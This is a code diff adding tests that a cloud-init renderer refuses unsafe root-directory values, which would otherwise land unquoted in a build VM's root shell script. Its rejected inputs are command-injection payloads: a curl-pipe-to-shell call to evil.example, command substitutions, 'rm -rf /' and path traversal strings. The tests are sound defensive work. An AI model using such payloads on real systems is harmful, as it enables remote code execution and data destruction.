@@ -296,3 +296,34 @@ test("THE LAST BUILD ARG IS NOT DROPPED", () => {
   assert.ok(loop, "expected the build-arg loop");
   assert.match(loop!, /\|\| \[ -n "\$line" \]/, "the loop must read a final unterminated line");
 });
+
+test("a root directory that is not a plain relative path is REFUSED at render time", () => {
+  // The root directory lands unquoted in the build VM's root shell script
+  // (2026-09-27 security scan, F12), so anything that could end a word or a
+  // line is refused rather than quoted.
+  for (const bad of [
+    "app; curl evil.example | sh",
+    "app$(id)",
+    "app`id`",
+    "app\nrm -rf /",
+    "../../etc",
+    "app/../../secret",
+    "app dir",
+    "app'x",
+  ]) {
+    assert.throws(
+      () => renderCloudInit(req({ rootDirectory: bad }), URLS),
+      /not a plain relative path/,
+      `accepted ${JSON.stringify(bad)}`,
+    );
+  }
+});
+
+test("ordinary root directories still render, slashes trimmed", () => {
+  for (const good of ["apps/web", "/apps/web/", "packages/api-v2", "src", "a..b"]) {
+    const out = renderCloudInit(req({ rootDirectory: good }), URLS);
+    assert.ok(out.length > 0, good);
+  }
+  const out = renderCloudInit(req({ rootDirectory: "/apps/web/" }), URLS);
+  assert.ok(out.includes("apps/web"), "trimmed path is used");
+});
